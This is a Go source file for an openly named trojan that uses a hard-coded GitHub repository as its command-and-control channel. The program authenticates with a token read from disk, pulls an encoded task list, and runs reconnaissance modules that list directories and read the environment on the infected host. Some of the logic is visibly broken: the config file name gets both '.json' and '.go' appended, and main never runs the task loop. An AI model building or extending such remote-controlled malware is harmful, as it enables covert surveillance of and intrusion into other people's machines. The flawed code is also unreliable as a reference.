package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"

	"github.com/YarKhan02/Trojan/modules"
	"github.com/google/go-github/v69/github"
	"golang.org/x/oauth2"
)

type Trojan struct {
	id         string
	config_file string
	data_path   string
	client     *github.Client
	ctx        context.Context
}

func NewTrojan(id string) (*Trojan, error) {
	client, ctx, err := github_connect()
	if err != nil {
		return nil, err
	}

	return &Trojan{
		id:         id,
		config_file: fmt.Sprintf("%s.json", id),
		data_path:   fmt.Sprintf("data/%s/", id),
		client:     client,
		ctx:        ctx,
	}, nil
}

var moduleRegistry = map[string]func(args ...interface{}){
	"dirlister":   modules.Dirlister,
	"environment": modules.Environment,
}

func (t *Trojan) get_config() {
	config_json, err := get_file_contents("config", t.config_file, t.client, t.ctx)
	if err != nil {
		return
	}

	decoded_bytes, err := base64.StdEncoding.DecodeString(config_json)
	if err != nil {
		return 
	}

	var config []map[string]interface{}
	err = json.Unmarshal(decoded_bytes, &config)
	if err != nil {
		return
	}

	for _, task := range config {
		if moduleName, ok := task["modules"].(string); ok {
			if moduleFunc, exists := moduleRegistry[moduleName]; exists {
				moduleFunc(".")
			} else {
				fmt.Println("Module not found:", moduleName)
			}
		}
	}
}

func github_connect() (*github.Client, context.Context, error) {
	token, err := os.ReadFile("token.txt")
	if err != nil {
		panic(err)
	}

	ctx := context.Background()
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: string(token)})
	tc := oauth2.NewClient(ctx, ts)

	client := github.NewClient(tc)

	return client, ctx, nil
}

func get_file_contents(dirname string, module_name string, client *github.Client, ctx context.Context) (string, error) {
	user := "YarKhan02"
	repo := "Trojan"
	filePath := dirname + "/" + module_name + ".go"
	

	file_content, _, _, err := client.Repositories.GetContents(ctx, user, repo, filePath, nil)
	if err != nil {
		return "", fmt.Errorf("failed to fetch file: %v", err)
	}

	content, err := file_content.GetContent()
	if err != nil {
		return "", fmt.Errorf("failed to get content: %v", err)
	}
	return content, nil
}

func main() {
	client, ctx, err := github_connect()
	if err != nil {
		log.Fatalf("Error connecting to GitHub: %v", err)
	}
	get_file_contents("modules", "dirlister", client, ctx)
}